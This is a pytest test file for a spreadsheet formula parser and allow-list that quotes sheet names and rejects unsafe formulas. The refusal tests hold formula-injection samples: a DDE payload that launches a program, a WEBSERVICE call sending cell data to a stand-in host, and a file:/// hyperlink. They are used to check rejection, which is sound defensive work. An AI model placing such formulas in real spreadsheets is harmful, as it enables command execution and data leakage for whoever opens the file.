# Copyright Thales 2026
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Formula parser, allow-list, reference checks and canonical emission."""

from __future__ import annotations

import pytest
from fred_capability_spreadsheet.formulas import (
    FormulaError,
    SheetLayout,
    check,
    emit,
    is_formula_like,
    parse,
    row_template,
    sheet_reference,
)

LAYOUTS = [
    SheetLayout("Données 2025", columns=3, data_rows=3, has_totals=True),
    SheetLayout("Synthèse", columns=3, data_rows=3, has_totals=False),
    SheetLayout("Q1", columns=2, data_rows=2, has_totals=False),
]
NAMES = [layout.name for layout in LAYOUTS]


def _check(text: str, here: str = "Synthèse", fill_rows: int = 0) -> str:
    node = check(parse(text, NAMES), LAYOUTS, here, fill_rows=fill_rows)
    return emit(node)


def _refused(text: str, here: str = "Synthèse") -> str:
    with pytest.raises(FormulaError) as info:
        _check(text, here)
    return str(info.value)


@pytest.mark.parametrize(
    ("name", "written"),
    [
        ("Données 2025", "'Données 2025'"),
        ("Synthèse", "'Synthèse'"),
        ("Q1", "'Q1'"),
        ("It's", "'It''s'"),
        ("Data_1", "Data_1"),
        ("TRUE", "'TRUE'"),
        ("2025", "'2025'"),
    ],
)
def test_sheet_names_are_quoted_as_excel_writes_them(name, written):
    assert sheet_reference(name) == written


@pytest.mark.parametrize(
    ("sent", "canonical"),
    [
        ("=SUM('Données 2025'!C2:C4)", "=SUM('Données 2025'!C2:C4)"),
        ("=SUM(Données 2025!C2:C4)", "=SUM('Données 2025'!C2:C4)"),
        ("=sum('données 2025'!c2:C4)", "=SUM('Données 2025'!C2:C4)"),
        ("=Q1!B2+'Q1'!$A$3", "='Q1'!B2+'Q1'!$A$3"),
        ("='Synthèse'!B2", "=B2"),
        ("=_xlfn.XLOOKUP(A2,Q1!A2:A3,Q1!B2:B3)", "=XLOOKUP(A2,'Q1'!A2:A3,'Q1'!B2:B3)"),
        ("=-2^2+3%", "=-2^2+3%"),
        ('=IF(A2>1,"a ""b""",)', '=IF(A2>1,"a ""b""",)'),
        ("=C2*(-2)", "=C2*(-2)"),
    ],
)
def test_accepted_forms_round_trip_to_canonical_text(sent, canonical):
    assert _check(sent) == canonical


def test_stored_form_has_excel_prefixes():
    node = check(
        parse("=FILTER(Q1!A2:B3,Q1!B2:B3>1)&XLOOKUP(1,A2:A3,B2:B3)&IFNA(A2,0)", NAMES),
        LAYOUTS,
        "Synthèse",
    )
    assert emit(node, stored=True) == (
        "=_xlfn._xlws.FILTER('Q1'!A2:B3,'Q1'!B2:B3>1)&_xlfn.XLOOKUP(1,A2:A3,B2:B3)"
        "&_xlfn.IFNA(A2,0)"
    )


@pytest.mark.parametrize(
    ("text", "fragment"),
    [
        ('=INDIRECT("B"&A2)', "INDIRECT is not accepted"),
        ("=OFFSET(A1,1,1)", "OFFSET is not accepted"),
        ("=TODAY()", "TODAY is not accepted"),
        ("=RAND()", "RAND is not accepted"),
        ('=WEBSERVICE("https://x.example/?"&A2)', "WEBSERVICE is not accepted"),
        ('=HYPERLINK("file:///C:/x")', "HYPERLINK is not accepted"),
        ('=CELL("filename")', "CELL is not accepted"),
        ("=CALL(A1)", "CALL is not accepted"),
        ('=TEXT(A2,"0")', "TEXT is not supported"),
        ("=SOMME(B2,B3)", "SUM instead of SOMME"),
        ("=SUM(B2;B3)", "not semicolons"),
        ("=[x.xlsx]Feuil1!A1", "another workbook"),
        ("='C:\\docs\\[a.xlsx]S'!A1", "another workbook"),
        ("=cmd|' /C calc'!A0", "DDE"),
        ("=SUM(B:B)", "whole-column"),
        ("=SUM(2:3)", "whole-column"),
        ("=Total*2", "defined names"),
        ("=Table1[@HT]", "structured references"),
        ("=R1C1", "R1C1"),
        ("=A2#", "spill reference"),
        ("={1,2}", "array constants"),
        ("=Synthese!B2", "sheet 'Synthese' does not exist"),
        ("='Données 2025'!D2", "columns A to C"),
        ("='Données 2025'!C9", "totals row 5"),
        ("=SUM('Données 2025'!C2:C5)", "use C2:C4"),
        ("=ROUND(1)", "ROUND takes 2"),
        ("=SUM(1", "ends too early"),
        ("=" + "(" * 40 + "1" + ")" * 40, "nests more than"),
    ],
)
def test_refusals_name_the_fix(text, fragment):
    assert fragment in _refused(text)


def test_formula_length_is_bounded():
    assert "8192" in _refused("=" + "+".join(["1"] * 5000))


def test_unknown_sheet_lists_the_workbook_sheets():
    message = _refused("=Foo!B2")
    assert "'Données 2025', 'Synthèse', 'Q1'" in message


def test_fill_down_is_checked_at_the_last_row():
    assert _check("=C2*2", fill_rows=2) == "=C2*2"
    message = _refused_fill("=C3*2", fill_rows=2)
    assert "outside the table" in message


def _refused_fill(text: str, fill_rows: int) -> str:
    with pytest.raises(FormulaError) as info:
        _check(text, fill_rows=fill_rows)
    return str(info.value)


def test_row_template_marks_the_own_row():
    node = parse('=IFERROR(C2/SUM($C$2:$C$4),"")')
    assert row_template(node, "{row}") == '=IFERROR(C{row}/SUM($C$2:$C$4),"")'
    assert row_template(parse("=C3+D2"), "{row}") is None


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("=SUM(B2:B6)", True),
        ("=B2/B3", True),
        ("=$B$2", True),
        ("='Données 2025'!B2", True),
        ("=Synthèse!B2", True),
        ("=[x.xlsx]S!A1", True),
        ("=cmd|' /C calc'!A0", True),
        ("=B:B", True),
        ("=1+1", False),
        ("=== Section ===", False),
        ("=Total*2", False),
        ("+1", False),
        ("plain", False),
    ],
)
def test_formula_like_strings(text, expected):
    assert is_formula_like(text) is expected
